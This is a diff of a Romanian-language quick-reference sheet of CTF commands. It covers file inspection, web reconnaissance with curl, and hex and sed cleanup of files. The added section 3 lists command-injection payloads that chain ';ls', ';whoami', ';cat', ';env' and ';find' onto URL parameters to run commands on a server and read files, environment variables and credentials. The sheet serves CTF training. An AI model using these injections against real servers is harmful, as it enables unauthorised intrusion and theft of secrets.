@@ -1,5 +1,6 @@
 # Comenzi CTF — Referință Rapidă
 
+
 1.
 `file [fisier]` — Identifică tipul real al fișierului prin magic bytes, indiferent de extensie
 `stat [fisier]` — Afișează metadate: dimensiune, timestamps, permisiuni
@@ -9,6 +10,7 @@
 `7z l -slt [arhiva]` — Listare tehnică universală, toate formatele, toate obiectele, toate detaliile
 `strings [fisier]` — Extrage toate șirurile ASCII printabile dintr-un fișier binar
 
+
 2.
 `ping -c [nr] [ip]` — verifică conectivitatea la nivel de rețea și măsoară latența către un server
 `curl -I [url]` — cerere HTTP HEAD, returnează doar headers pentru fingerprinting rapid fără a descărca body-ul
@@ -17,4 +19,28 @@
 `curl [url]/robots.txt` — primul fișier de verificat pe orice server web, listează rutele excluse din indexare
 `curl [url]/sitemap.xml` — harta completă a site-ului, dezvăluie toate rutele existente
 
+
 3.
+`curl -s "[url]"` — cerere silențioasă fără bara de progres, folosit când vrei output curat în terminal
+`curl -s "[url];[comanda]"` — testare și exploatare Command Injection prin separatorul `;` în parametri URL
+`curl -s "[url];ls"` — listează directorul curent al serverului după confirmare injection
+`curl -s "[url];pwd"` — afișează calea absolută a directorului curent pe server
+`curl -s "[url];whoami"` — afișează utilizatorul cu care rulează procesul web pe server
+`curl -s "[url];cat+[fisier]"` — citește codul sursă brut al unui fișier de pe server, `+` encodează spațiul în URL
+`curl -s "[url];env"` — afișează variabilele de mediu ale serverului, pot conține credențiale sau chei
+`curl -s "[url];find / -name '[pattern]' 2>/dev/null"` — caută fișiere pe server după nume, `2>/dev/null` suprimă erorile de permisiuni
+
+
+4.
+`strings [fisier] | head -[nr]` — afișează primele N șiruri ASCII din fișier, util pentru inspecție rapidă fără output masiv
+`xxd [fisier] | grep -c "[pattern_hex]"` — numără câte linii conțin un pattern hex specific, confirmă prezența și răspândirea noise-ului
+`sed 's/[pattern]//g' [input] > [output]` — elimină toate aparițiile unui pattern ASCII dintr-un fișier și salvează rezultatul, `g` aplică global pe toate aparițiile
+`xdg-open [fisier]` — deschide un fișier cu aplicația implicită a sistemului, echivalentul dublu-click în terminal
+
+
+
+
+
+
+
+
